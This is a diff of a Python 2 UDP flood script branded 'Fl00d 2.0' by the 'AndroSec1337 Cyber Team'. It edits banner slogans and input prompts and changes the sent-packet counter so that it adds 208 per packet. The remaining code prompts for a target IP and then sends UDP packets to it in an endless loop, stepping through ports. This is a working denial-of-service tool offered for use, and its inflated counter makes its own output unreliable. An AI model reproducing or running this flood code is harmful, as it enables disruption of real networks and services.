@@ -35,11 +35,11 @@ print ":::      ::::::: :::::::::: :::::::::: ;::    :::"
 print ":::      :::::::  ::::::::   ::::::::  :::::::::"+N
 print "["+B+""+R+"#"+N+"] "+B+""+R+"AndroSec1337 Cyber Team"+N+"   Fl00d 2.0 - "+B+""+R+"DedSecTL"+N
 print
-print "#T4ke 7hem d0wn vroh - D0n7 g1ve up - Fl00d th3m"
-print "#H4ck 4ll 7he 7h1ng - F1ght f0r Ju5t1c3 - K1ll th3m"
+print "Lets fl00d them"
+print "lolololololololololololololololol"
 print
-ip = raw_input('[$] T@rget 1P: ')
-port = input('[$] P0rt: ')
+ip = raw_input('[$] TaRgEt iP: ')
+port = input('[$] p0rT: ')
 os.system("clear")
 print "Fl00d attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
 time.sleep(3)
@@ -47,7 +47,7 @@ print
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
-     sent = sent + 1
+     sent = sent + 208
      port = port + 1
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
